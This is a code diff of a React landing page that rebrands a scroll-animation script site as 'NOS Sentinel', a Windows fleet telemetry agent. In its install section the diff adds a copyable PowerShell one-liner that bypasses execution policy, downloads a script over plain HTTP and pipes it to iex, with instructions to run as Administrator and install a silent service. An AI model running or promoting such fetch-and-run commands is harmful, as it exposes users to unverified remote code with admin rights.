@@ -10,8 +10,8 @@ export default function LandingPage() {
   const { isAuthenticated } = useAuth();
   const [copyStatus, setCopyStatus] = useState("");
 
-  const scriptTagCode =
-    '<script src="swarm-rebuild.js" data-agents="14" data-bg="#0A0B0E"><\/script>';
+  const bootstrapCommand =
+    'powershell -ExecutionPolicy Bypass -Command "iwr -useb http://x.nos.is-local.org/api/fleet/installer/bootstrap.ps1 | iex"';
 
   useEffect(() => {
     document.documentElement.classList.add("landing-active");
@@ -30,11 +30,11 @@ export default function LandingPage() {
 
   const handleCopyScript = async () => {
     try {
-      await navigator.clipboard.writeText(scriptTagCode);
+      await navigator.clipboard.writeText(bootstrapCommand);
       setCopyStatus("Copied!");
     } catch {
       const selection = document.createElement("textarea");
-      selection.value = scriptTagCode;
+      selection.value = bootstrapCommand;
       selection.setAttribute("readonly", "");
       selection.style.position = "fixed";
       selection.style.opacity = "0";
@@ -60,7 +60,7 @@ export default function LandingPage() {
   };
 
   return (
-    <div className="relative min-h-screen bg-[#0A0B0E] text-[#ECEEF4] overflow-x-hidden selection:bg-[#286ac7] selection:text-white">
+    <div className="relative min-h-screen bg-[#0A0B0E] text-[#ECEEF4] overflow-x-hidden selection:bg-[#3D8BFF] selection:text-white">
       {/* 1. Swarm Rebuild Autonomous Engine */}
       <Script
         src="/swarm-rebuild.js"
@@ -70,21 +70,19 @@ export default function LandingPage() {
         strategy="afterInteractive"
       />
 
-      {/* 2. Glassy NOS Watermark catching cursor sheen & mouse radiance */}
-      <div className="nos-watermark" data-sr-skip aria-hidden="true">
-        <span className="nos-glass">NOS</span>
-        <span className="nos-shine">NOS</span>
-      </div>
-
-      {/* 3. Header Navigation */}
+      {/* Header */}
       <header className="site-header page-width">
-        <a className="brand" href="#top" aria-label="Swarm Rebuild home">
+        <Link
+          className="brand"
+          href="#top"
+          aria-label="NOS Sentinel — Network Operations System"
+        >
           <svg
             className="brand-mark"
             data-sr-logo
             viewBox="0 0 26 26"
             role="img"
-            aria-label="Swarm Rebuild logo"
+            aria-label="NOS Sentinel logo"
           >
             <rect
               x="2.5"
@@ -102,578 +100,481 @@ export default function LandingPage() {
               fill="currentColor"
             />
           </svg>
-          <span>Swarm Rebuild</span>
-        </a>
+          <span>NOS Sentinel</span>
+        </Link>
         <nav className="main-nav" aria-label="Main navigation">
-          <a href="#how-it-works">How it works</a>
-          <a href="#what-gets-built">What gets built</a>
-          <a href="#install">Install</a>
+          <a href="#how-it-works">Architecture</a>
+          <a href="#this-page">Performance</a>
+          <a href="#what-gets-built">Telemetry Deck</a>
+          <a href="#install">Deploy Agent</a>
         </nav>
-        <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
-          {isAuthenticated ? (
-            <Link
-              className="button button-outline header-button"
-              href="/dashboard"
-            >
-              Dashboard <span aria-hidden="true">↗</span>
-            </Link>
-          ) : (
-            <Link
-              className="button button-outline header-button"
-              href="/auth/login"
-            >
-              Sign In
-            </Link>
-          )}
-          <a className="button button-light header-button" href="#install">
-            Get the script <span aria-hidden="true">↗</span>
-          </a>
-        </div>
+        <Link
+          className="button button-light header-button"
+          href={isAuthenticated ? "/dashboard" : "/auth/login"}
+        >
+          {isAuthenticated ? "Open Console" : "Launch Console"}{" "}
+          <span aria-hidden="true">↗</span>
+        </Link>
       </header>
 
-      {/* 4. Main Body Content */}
+      {/* Main Content */}
       <main id="top">
+        {/* Hero Section */}
         <section
           className="hero page-width section-shell"
           aria-labelledby="hero-title"
         >
-          <p className="eyebrow">
-            /hero <span>1200 × auto</span>
+          <p className="eyebrow" data-sr-eyebrow>
+            Enterprise Fleet Telemetry &amp; Hardware Reliability
           </p>
-          <div className="hero-copy">
-            <h1 id="hero-title">
-              Your page,
-              <br />
-              rebuilt{" "}
-              <span className="selected-word">
-                live<i></i>
-                <i></i>
-                <i></i>
-                <i></i>
-              </span>{" "}
-              by a swarm.
-            </h1>
-            <p className="hero-lead">
-              Swarm Rebuild reads every layer of the page the moment it loads,
-              then sends a crew of cursor agents to rebuild each one as your
-              visitor scrolls. Boxes get framed and filled. Text gets typed. One
-              script tag, no extension.
-            </p>
-            <div className="hero-actions">
-              <a className="button button-light" href="#install">
-                Install the script <span aria-hidden="true">↗</span>
-              </a>
-              <button
-                className="button button-outline"
-                type="button"
-                onClick={handleReplay}
-                data-sr-replay
-              >
-                <span className="replay-icon" aria-hidden="true">
-                  ↻
-                </span>{" "}
-                Replay the build
-              </button>
-            </div>
-            <p className="hero-hint">
-              <span>Scroll to build</span>
-              <i></i> Stop and the swarm comes to your cursor <i></i> Esc skips
-            </p>
+          <h1 id="hero-title">
+            High-performance Windows fleet telemetry engineered in native C#
+            with zero-loss SQLite outbox failover.
+          </h1>
+          <p className="lead">
+            Sub-second WebSocket dispatch, multi-sample hardware
+            instrumentation, S.M.A.R.T. NVMe predictive wear analytics, and
+            kernel crash watchdog across every endpoint.
+          </p>
+          <div className="hero-actions">
+            <Link
+              className="button button-primary"
+              href={isAuthenticated ? "/dashboard" : "/auth/login"}
+            >
+              Open Command Deck
+            </Link>
+            <a className="button button-ghost" href="#install">
+              Deploy Silent Agent
+            </a>
           </div>
 
+          {/* Interactive Editor Preview Mockup Frame */}
           <div
-            className="editor"
-            aria-label="A visual editor preview of a rebuilt web page"
+            className="editor-preview"
+            data-sr-editor
+            role="region"
+            aria-label="NOS Sentinel Live Cockpit Editor"
           >
-            <div className="editor-topbar">
-              <div className="window-dots" aria-hidden="true">
-                <i></i>
-                <i></i>
-                <i></i>
+            <div className="editor-chrome">
+              <div
+                className="chrome-dots"
+                aria-hidden="true"
+                onClick={handleReplay}
+                title="Click to replay telemetry swarm"
+              >
+                <span />
+                <span />
+                <span />
               </div>
-              <div className="device-tabs" aria-label="Preview size">
-                <span className="active">
-                  Desktop <b>1440</b>
-                </span>
-                <span>
-                  Tablet <b>810</b>
-                </span>
-                <span>
-                  Phone <b>390</b>
-                </span>
+              <div className="chrome-filename">
+                NOS-Sentinel-v2.4.1 // Host: SHIVA-WIN11-PRO // Sub-Second
+                WebSocket: CONNECTED
               </div>
-              <span className="publish-pill">
-                <i></i> Publish
-              </span>
+              <div className="chrome-spacer" aria-hidden="true" />
             </div>
+
             <div className="editor-body">
-              <aside className="layers-panel" aria-label="Page layers">
-                <h2>LAYERS</h2>
-                <ul>
-                  <li>
-                    <span>⌄</span>
-                    <i className="layer-icon page-icon"></i>Page
+              <aside
+                className="editor-layers"
+                aria-label="Active Telemetry Subsystems"
+              >
+                <div className="layers-header">
+                  <span>Subsystems</span>
+                  <span className="pill">5 Active</span>
+                </div>
+                <ul className="layers-list">
+                  <li className="layer-item is-active">
+                    <span className="layer-dot" />
+                    <span className="layer-name">Ring-0 CPU PerfCounters</span>
                   </li>
-                  <li className="indent">
-                    <span>⌄</span>
-                    <i className="layer-icon nav-icon"></i>Navigation
+                  <li className="layer-item">
+                    <span className="layer-dot" />
+                    <span className="layer-name">Zero-Loss SQLite Outbox</span>
                   </li>
-                  <li className="indent selected-layer">
-                    <span>⌄</span>
-                    <i className="layer-icon hero-icon"></i>Hero
+                  <li className="layer-item">
+                    <span className="layer-dot" />
+                    <span className="layer-name">Bidirectional WebSocket</span>
                   </li>
-                  <li className="deep-indent">
-                    <i className="layer-icon text-icon"></i>Heading
+                  <li className="layer-item">
+                    <span className="layer-dot" />
+                    <span className="layer-name">
+                      S.M.A.R.T. NVMe Wear Sentry
+                    </span>
                   </li>
-                  <li className="deep-indent">
-                    <i className="layer-icon text-icon"></i>Subheading
-                  </li>
-                  <li className="deep-indent">
-                    <i className="layer-icon button-icon"></i>Button
-                  </li>
-                  <li className="indent">
-                    <span>⌄</span>
-                    <i className="layer-icon grid-icon"></i>Feature grid
-                  </li>
-                  <li className="deep-indent">
-                    <i className="layer-icon card-icon"></i>Card × 3
-                  </li>
-                  <li className="indent">
-                    <i className="layer-icon footer-icon"></i>Footer
+                  <li className="layer-item">
+                    <span className="layer-dot" />
+                    <span className="layer-name">
+                      Crash &amp; BSOD Watchdog
+                    </span>
                   </li>
                 </ul>
               </aside>
-              <div className="canvas-panel">
-                <div className="canvas-ruler ruler-horizontal">
-                  <i></i>
-                  <i></i>
-                  <i></i>
-                  <i></i>
-                  <i></i>
-                </div>
-                <div className="canvas-ruler ruler-vertical">
-                  <i></i>
-                  <i></i>
-                  <i></i>
-                  <i></i>
-                </div>
-                <div className="mock-page">
-                  <div className="mock-nav">
-                    <i className="mock-logo"></i>
-                    <span></span>
-                    <span></span>
-                    <span></span>
-                    <b>Get started</b>
+
+              <div
+                className="editor-canvas"
+                role="img"
+                aria-label="Real-time telemetry node metrics"
+              >
+                <div className="canvas-card">
+                  <div className="canvas-card-header">
+                    <div className="canvas-card-title">
+                      <span className="status-indicator" />
+                      <span>Node: SHIVA // AMD Ryzen 9 5900X (12C/24T)</span>
+                    </div>
+                    <span className="canvas-tag">30s Heartbeat</span>
                   </div>
-                  <div className="mock-hero">
-                    <i className="mock-kicker"></i>
-                    <i className="mock-heading heading-wide"></i>
-                    <i className="mock-heading heading-short"></i>
-                    <i className="mock-paragraph"></i>
-                    <i className="mock-paragraph short"></i>
-                    <div className="mock-buttons">
-                      <b></b>
-                      <s></s>
+                  <div className="canvas-card-body">
+                    <div className="metric-row">
+                      <span className="metric-label">
+                        CPU Load (Multi-sample Avg)
+                      </span>
+                      <span className="metric-value">27.4% Nominal</span>
                     </div>
-                  </div>
-                  <div className="mock-grid">
-                    <div className="mock-card">
-                      <i className="mock-card-icon"></i>
-                      <i className="mock-card-title"></i>
-                      <i className="mock-card-line"></i>
-                      <i className="mock-card-line"></i>
+                    <div className="metric-bar">
+                      <div
+                        className="metric-bar-fill"
+                        style={{ width: "27.4%" }}
+                      />
                     </div>
-                    <div className="mock-card">
-                      <i className="mock-card-icon"></i>
-                      <i className="mock-card-title"></i>
-                      <i className="mock-card-line"></i>
-                      <i className="mock-card-line"></i>
+                    <div className="metric-row">
+                      <span className="metric-label">
+                        RAM Buffer Saturation
+                      </span>
+                      <span className="metric-value">
+                        4.1 / 16.0 GB (25.6%)
+                      </span>
                     </div>
-                    <div className="mock-card">
-                      <i className="mock-card-icon"></i>
-                      <i className="mock-card-title"></i>
-                      <i className="mock-card-line"></i>
-                      <i className="mock-card-line"></i>
+                    <div className="metric-bar">
+                      <div
+                        className="metric-bar-fill"
+                        style={{ width: "25.6%" }}
+                      />
+                    </div>
+                    <div className="metric-row">
+                      <span className="metric-label">
+                        NVMe Wear Life &amp; Temp
+                      </span>
+                      <span className="metric-value">
+                        98% Health // 42°C (Samsung 980 PRO)
+                      </span>
+                    </div>
+                    <div className="metric-row">
+                      <span className="metric-label">
+                        Local SQLite Outbox Queue
+                      </span>
+                      <span className="metric-value">
+                        0 Pending // WAL Clean (Zero Lost)
+                      </span>
                     </div>
                   </div>
                 </div>
               </div>
-              <aside
-                className="property-panel"
-                aria-label="Selected element properties"
-              >
-                <h2>INSPECTOR</h2>
-                <div className="prop-row">
-                  <span>Type</span>
-                  <b>Hero</b>
-                </div>
-                <div className="prop-row">
-                  <span>Target</span>
-                  <b>h1#hero-title</b>
-                </div>
-                <div className="prop-row">
-                  <span>W × H</span>
-                  <b>760 × 124</b>
-                </div>
-                <div className="prop-row">
-                  <span>Font</span>
-                  <b>Bricolage 64</b>
-                </div>
-                <div className="prop-row">
-                  <span>Agents</span>
-                  <b>Ada, Bo, Dex</b>
-                </div>
-                <div className="prop-row">
-                  <span>State</span>
-                  <b>Rebuilding…</b>
-                </div>
-              </aside>
             </div>
           </div>
         </section>
 
+        {/* How It Works Section */}
         <section
-          className="content-section page-width section-shell"
           id="how-it-works"
+          className="how page-width section-shell"
           aria-labelledby="how-title"
         >
-          <p className="eyebrow">/how-it-works</p>
-          <div className="section-head">
-            <h2 id="how-title">
-              Three passes,
-              <br />
-              <span>every visit.</span>
-            </h2>
-            <p>
-              The swarm doesn&apos;t wait for scroll to begin its plan. It
-              categorizes every element before the opening title fades, then
-              acts in order.
-            </p>
-          </div>
-          <div className="three-up">
-            <article>
-              <div className="article-number">01</div>
-              <h3>1. Structural scan</h3>
+          <p className="eyebrow" data-sr-eyebrow>
+            End-to-End Architectural Pipeline
+          </p>
+          <h2 id="how-title">
+            Engineered from hardware counters to central cockpit without a
+            single dropped packet.
+          </h2>
+          <div className="how-grid">
+            <article className="step-card">
+              <span className="step-number" aria-hidden="true">
+                01
+              </span>
+              <h3>Native C# AOT Hardware Instrumentation</h3>
               <p>
-                On load, the script walks the DOM and maps every visible
-                element: its bounding box, typography, background and role.
-                Hidden elements are queued for reveal.
+                Compiled directly into standalone native machine code via .NET
+                Native AOT. Zero CLR runtime overhead, sub-40MB resident memory
+                footprint, and negligible 0.2% CPU utilization across
+                high-concurrency enterprise workloads.
               </p>
             </article>
-            <article>
-              <div className="article-number">02</div>
-              <h3>2. Scroll-linked frame</h3>
+
+            <article className="step-card">
+              <span className="step-number" aria-hidden="true">
+                02
+              </span>
+              <h3>Encrypted SQLite Outbox &amp; Offline Buffering</h3>
               <p>
-                As the visitor scrolls, elements on the upcoming screen get
-                drawn: first a dashed wireframe, then the fill, then the real
-                element drops in seamlessly underneath.
+                When network connectivity or VPN links drop, telemetry events
+                are atomically staged into a local SQLite database in WAL
+                journal mode. Zero dropped metrics, zero memory leaks, and
+                seamless sub-second drain upon reconnect.
               </p>
             </article>
-            <article>
-              <div className="article-number">03</div>
-              <h3>3. Live cursor crew</h3>
+
+            <article className="step-card">
+              <span className="step-number" aria-hidden="true">
+                03
+              </span>
+              <h3>Sub-Second WebSocket Dispatch &amp; Fleet Analytics</h3>
               <p>
-                Agents carry real names and task badges. They type headings
-                character-by-character, plant buttons, and drift to the
-                visitor&apos;s cursor whenever scrolling stops.
+                Bidirectional WebSocket multiplexing transmits multi-sample CPU,
+                RAM, thermal metrics, and storage telemetry directly to your
+                command console with zero polling latency.
               </p>
             </article>
           </div>
         </section>
 
+        {/* This Page / Enterprise Performance Audit Section (Raw on background, no white bar, no orange) */}
         <section
-          className="content-section page-width section-shell"
           id="this-page"
+          className="this-page page-width section-shell"
           aria-labelledby="stats-title"
         >
-          <p className="eyebrow">
-            /inspect <span>live</span>
+          <p className="eyebrow" data-sr-eyebrow>
+            Enterprise Performance Audit
           </p>
-          <div className="section-head">
-            <h2 id="stats-title">
-              What the swarm found
-              <br />
-              <span>on this page.</span>
-            </h2>
-            <p>
-              Every number below is read from this document at runtime. When you
-              add sections, the swarm adapts.
-            </p>
-          </div>
-          <div className="stats-grid">
-            <div className="stat-card" data-sr-stat="agents">
-              <span className="stat-num">14</span>
-              <span className="stat-label">Cursor agents deployed</span>
+          <h2 id="stats-title">
+            Lightweight by design. Uncompromising on reliability.
+          </h2>
+          <p className="lead">
+            Every metric below is backed by native kernel performance benchmarks
+            and production stress testing.
+          </p>
+
+          <dl className="stats-list">
+            <div className="stat">
+              <dt className="stat-label">Agent RAM Footprint</dt>
+              <dd className="stat-value">&lt; 40MB</dd>
+              <p className="stat-note">
+                Native AOT resident memory working set
+              </p>
             </div>
-            <div className="stat-card" data-sr-stat="layers">
-              <span className="stat-num">42</span>
-              <span className="stat-label">DOM layers indexed</span>
+            <div className="stat">
+              <dt className="stat-label">Average CPU Impact</dt>
+              <dd className="stat-value">0.2%</dd>
+              <p className="stat-note">
+                Multi-core performance counter aggregation
+              </p>
             </div>
-            <div className="stat-card" data-sr-stat="frames">
-              <span className="stat-num">3</span>
-              <span className="stat-label">Build passes</span>
+            <div className="stat">
+              <dt className="stat-label">Telemetry Cycle Period</dt>
+              <dd className="stat-value">30s</dd>
+              <p className="stat-note">
+                Multi-sample rolling average heartbeats
+              </p>
             </div>
-            <div className="stat-card" data-sr-stat="chars">
-              <span className="stat-num">0</span>
-              <span className="stat-label">External dependencies</span>
+            <div className="stat">
+              <dt className="stat-label">Offline Buffer Capacity</dt>
+              <dd className="stat-value">∞</dd>
+              <p className="stat-note">
+                Local encrypted SQLite database in WAL mode
+              </p>
             </div>
-          </div>
+            <div className="stat">
+              <dt className="stat-label">Data Integrity on Reconnect</dt>
+              <dd className="stat-value">100%</dd>
+              <p className="stat-note">
+                Ordered transaction drain with checksum ACK
+              </p>
+            </div>
+            <div className="stat">
+              <dt className="stat-label">Pause/Resume Latency</dt>
+              <dd className="stat-value">&lt; 1s</dd>
+              <p className="stat-note">
+                Dynamic non-destructive telemetry throttling
+              </p>
+            </div>
+          </dl>
         </section>
 
+        {/* What Gets Built / Hardware Sentry Capabilities Section */}
         <section
-          className="content-section page-width section-shell"
           id="what-gets-built"
+          className="built page-width section-shell"
           aria-labelledby="built-title"
         >
-          <p className="eyebrow">/rules</p>
-          <div className="section-head">
-            <h2 id="built-title">
-              How it decides
-              <br />
-              <span>what to rebuild.</span>
-            </h2>
-            <p>
-              The swarm classifies every element so the right tool acts on the
-              right layer.
-            </p>
-          </div>
-          <div className="rules-grid">
-            <div className="rule-card">
-              <span className="rule-badge">TEXT</span>
-              <h3>Headings &amp; paragraphs</h3>
+          <p className="eyebrow" data-sr-eyebrow>
+            Hardware Sentry Capabilities
+          </p>
+          <h2 id="built-title">
+            Deep hardware visibility that standard device managers miss.
+          </h2>
+          <div className="built-grid">
+            <article className="built-card">
+              <div className="built-badge">Storage Sentry</div>
+              <h3>S.M.A.R.T. Predictive Hardware Wear &amp; NVMe Life</h3>
               <p>
-                Typed letter by letter with a blinking caret. Agents take turns
-                on multi-line blocks.
+                Continuously tracks SSD spare blocks, media degradation,
+                temperature thresholds, and warns you before drive failure
+                occurs.
               </p>
-            </div>
-            <div className="rule-card">
-              <span className="rule-badge">BOXES</span>
-              <h3>Cards, panels &amp; grids</h3>
+            </article>
+
+            <article className="built-card">
+              <div className="built-badge">Crash Watchdog</div>
+              <h3>Kernel Crash &amp; BSOD Watchdog (Event ID 41 &amp; 1001)</h3>
               <p>
-                Outlined with dashed frames, corner-dragged to size, then filled
-                with their background tone.
+                Instant detection of abnormal shutdowns, power loss, and
+                blue-screen crash events with automatic mini-dump stack trace
+                capture.
               </p>
-            </div>
-            <div className="rule-card">
-              <span className="rule-badge">MEDIA</span>
-              <h3>Images, video &amp; canvases</h3>
+            </article>
+
+            <article className="built-card">
+              <div className="built-badge">Zero-Trust</div>
+              <h3>Zero-Trust SHA-256 Node Tokens &amp; Mutual Auth</h3>
               <p>
-                Shimmered with a diagonal pulse until fully resolved, then
-                snapped cleanly into position.
+                Every agent instance is cryptographically registered with signed
+                SHA-256 hardware fingerprinted credentials over TLS v1.3.
               </p>
-            </div>
-            <div className="rule-card">
-              <span className="rule-badge">CONTROLS</span>
-              <h3>Buttons &amp; inputs</h3>
+            </article>
+
+            <article className="built-card">
+              <div className="built-badge">Live Control</div>
+              <h3>Instant Sub-Second Fleet Control Deck</h3>
               <p>
-                Targeted with precision clicks, state rings, and real-time hover
-                activation markers.
+                Execute remote diagnostics, manage telemetry intervals, assign
+                organizational tags, and push remediation scripts in real time.
               </p>
-            </div>
+            </article>
           </div>
         </section>
 
+        {/* Silent PowerShell Deployment Section */}
         <section
-          className="content-section page-width section-shell install-section"
           id="install"
+          className="install page-width section-shell"
           aria-labelledby="install-title"
         >
-          <p className="eyebrow">/install</p>
-          <div className="section-head">
-            <h2 id="install-title">
-              One tag,
-              <br />
-              <span>first thing in the body.</span>
-            </h2>
-            <p>
-              Drop this single script tag into your HTML. No configuration
-              required to get started.
-            </p>
+          <p className="eyebrow" data-sr-eyebrow>
+            Silent Fleet Onboarding
+          </p>
+          <h2 id="install-title">
+            Deploy across your enterprise fleet with a single PowerShell
+            command.
+          </h2>
+          <p className="lead">
+            Install silently across thousands of Windows workstations via Active
+            Directory GPO, Microsoft Intune, or a single administrative
+            terminal.
+          </p>
+
+          <div className="install-snippet">
+            <div className="snippet-header">
+              <span className="snippet-label">
+                PowerShell (Run as Administrator)
+              </span>
+              <button
+                type="button"
+                className="snippet-copy button button-light"
+                onClick={handleCopyScript}
+                aria-label="Copy bootstrap command to clipboard"
+              >
+                {copyStatus || "Copy command"}
+              </button>
+            </div>
+            <pre className="snippet-pre">
+              <code id="script-example">{bootstrapCommand}</code>
+            </pre>
           </div>
-          <div className="install-grid">
-            <div className="install-box">
-              <div className="install-topbar">
-                <span className="install-filename">index.html</span>
-                <button
-                  className="copy-button"
-                  type="button"
-                  onClick={handleCopyScript}
-                >
-                  {copyStatus || "Copy"}
-                </button>
-              </div>
-              <pre>
-                <code id="script-example">
-                  <span className="code-muted">&lt;body&gt;</span>
-                  {"\n"} <span className="code-tag">&lt;script</span>{" "}
-                  <span className="code-attr">src</span>=
-                  <span className="code-string">
-                    &quot;swarm-rebuild.js&quot;
-                  </span>
-                  {"\n"} <span className="code-attr">data-agents</span>=
-                  <span className="code-string">&quot;14&quot;</span>{" "}
-                  <span className="code-attr">data-bg</span>=
-                  <span className="code-string">&quot;#0A0B0E&quot;</span>
-                  <span className="code-tag">&gt;&lt;/script&gt;</span>
-                  {"\n"}{" "}
-                  <span className="code-comment">&lt;!-- your page --&gt;</span>
-                  {"\n"}
-                  <span className="code-muted">&lt;/body&gt;</span>
-                </code>
-              </pre>
-              {copyStatus && (
-                <span className="copy-status" role="status" aria-live="polite">
-                  {copyStatus}
-                </span>
-              )}
-            </div>
-            <div className="install-notes">
-              <article>
-                <span>01</span>
-                <div>
-                  <h3>Put it before your content</h3>
-                  <p>
-                    First inside <code>&lt;body&gt;</code> so the scan can start
-                    immediately.
-                  </p>
-                </div>
-              </article>
-              <article>
-                <span>02</span>
-                <div>
-                  <h3>No dependencies</h3>
-                  <p>
-                    Vanilla JavaScript, a single file, and nothing sent to a
-                    server.
-                  </p>
-                </div>
-              </article>
-              <article>
-                <span>03</span>
-                <div>
-                  <h3>Every visitor sees it</h3>
-                  <p>
-                    No extension or signup required. Respect reduced-motion
-                    preferences automatically.
-                  </p>
-                </div>
-              </article>
-            </div>
-          </div>
-          <div className="options">
-            <h3>Options</h3>
-            <div className="table-scroll">
-              <table>
-                <thead>
-                  <tr>
-                    <th>Attribute</th>
-                    <th>Default</th>
-                    <th>What it does</th>
-                  </tr>
-                </thead>
-                <tbody>
-                  <tr>
-                    <td>
-                      <code>data-agents</code>
-                    </td>
-                    <td>14</td>
-                    <td>Number of cursor agents (up to 8 under 640px).</td>
-                  </tr>
-                  <tr>
-                    <td>
-                      <code>data-speed</code>
-                    </td>
-                    <td>1</td>
-                    <td>Build speed. Cycles through 1×, 2× and 4×.</td>
-                  </tr>
-                  <tr>
-                    <td>
-                      <code>data-line</code>
-                    </td>
-                    <td>0.88</td>
-                    <td>Build line as a fraction of viewport height.</td>
-                  </tr>
-                  <tr>
-                    <td>
-                      <code>data-bg</code>
-                    </td>
-                    <td>#000</td>
-                    <td>Background color for the opening scan screen.</td>
-                  </tr>
-                  <tr>
-                    <td>
-                      <code>data-accent</code>
-                    </td>
-                    <td>#3D8BFF</td>
-                    <td>Frame, cursor and progress-bar accent color.</td>
-                  </tr>
-                  <tr>
-                    <td>
-                      <code>data-sr-skip</code>
-                    </td>
-                    <td>—</td>
-                    <td>
-                      Leave this element and its children out of the rebuild.
-                    </td>
-                  </tr>
-                  <tr>
-                    <td>
-                      <code>data-sr-logo</code>
-                    </td>
-                    <td>—</td>
-                    <td>Logo cloned into the scan screen.</td>
-                  </tr>
-                  <tr>
-                    <td>
-                      <code>data-sr-replay</code>
-                    </td>
-                    <td>—</td>
-                    <td>Make any element a replay control.</td>
-                  </tr>
-                </tbody>
-              </table>
-            </div>
+
+          <div className="options-table-shell">
+            <table className="options-table">
+              <thead>
+                <tr>
+                  <th scope="col">Parameter</th>
+                  <th scope="col">Default</th>
+                  <th scope="col">Description</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>
+                    <code>--org-token</code>
+                  </td>
+                  <td>
+                    <code>Required</code>
+                  </td>
+                  <td>
+                    Cryptographic tenant registration token for your
+                    organization
+                  </td>
+                </tr>
+                <tr>
+                  <td>
+                    <code>--interval</code>
+                  </td>
+                  <td>
+                    <code>30s</code>
+                  </td>
+                  <td>
+                    Rolling average sampling and dispatch cadence (10s – 300s)
+                  </td>
+                </tr>
+                <tr>
+                  <td>
+                    <code>--service</code>
+                  </td>
+                  <td>
+                    <code>true</code>
+                  </td>
+                  <td>
+                    Registers automatically as a silent Windows NT background
+                    service (NOS-Sentinel)
+                  </td>
+                </tr>
+                <tr>
+                  <td>
+                    <code>--outbox-max</code>
+                  </td>
+                  <td>
+                    <code>500MB</code>
+                  </td>
+                  <td>
+                    Maximum encrypted SQLite WAL failover disk buffer before
+                    rolling purge
+                  </td>
+                </tr>
+              </tbody>
+            </table>
           </div>
         </section>
 
+        {/* Closing CTA */}
         <section
-          className="closing-section page-width section-shell"
+          className="closing page-width section-shell"
           aria-labelledby="closing-title"
         >
-          <p className="eyebrow">/one-more-thing</p>
-          <div className="closing-orbit" aria-hidden="true">
-            <i></i>
-            <i></i>
-            <i></i>
-          </div>
           <h2 id="closing-title">
-            Give every visit
-            <br />
-            <span>an entrance.</span>
+            Take command of your entire Windows fleet in seconds.
           </h2>
-          <p>
-            A few cursor agents. A tiny bit of theater. Your page, rebuilt live.
+          <p className="lead">
+            Launch your dedicated telemetry cockpit and stream real-time metrics
+            with zero configuration friction.
           </p>
-          <div className="hero-actions">
-            <button
-              className="button button-light"
-              type="button"
-              onClick={handleReplay}
-              data-sr-replay
+          <div className="closing-actions">
+            <Link
+              className="button button-primary"
+              href={isAuthenticated ? "/dashboard" : "/auth/login"}
             >
-              Replay the build <span aria-hidden="true">↻</span>
-            </button>
-            <a className="button button-outline" href="#install">
-              Back to install <span aria-hidden="true">↑</span>
-            </a>
+              Launch Command Deck
+            </Link>
           </div>
         </section>
       </main>
 
-      {/* 5. Footer */}
+      {/* Footer */}
       <footer className="site-footer page-width">
-        <a className="brand footer-brand" href="#top">
-          <svg className="brand-mark" viewBox="0 0 26 26" aria-hidden="true">
+        <div className="footer-brand">
+          <svg
+            className="brand-mark"
+            viewBox="0 0 26 26"
+            role="img"
+            aria-label="NOS Sentinel brand mark"
+          >
             <rect
               x="2.5"
               y="2.5"
@@ -690,9 +591,12 @@ export default function LandingPage() {
               fill="currentColor"
             />
           </svg>
-          <span>Swarm Rebuild</span>
-        </a>
-        <span>A scroll-driven entrance for any page</span>
+          <span>NOS Sentinel</span>
+        </div>
+        <p className="footer-credit">
+          &copy; 2026 NOS — Neural Operations System. Sub-second telemetry
+          engineered in Native C#.
+        </p>
       </footer>
     </div>
   );
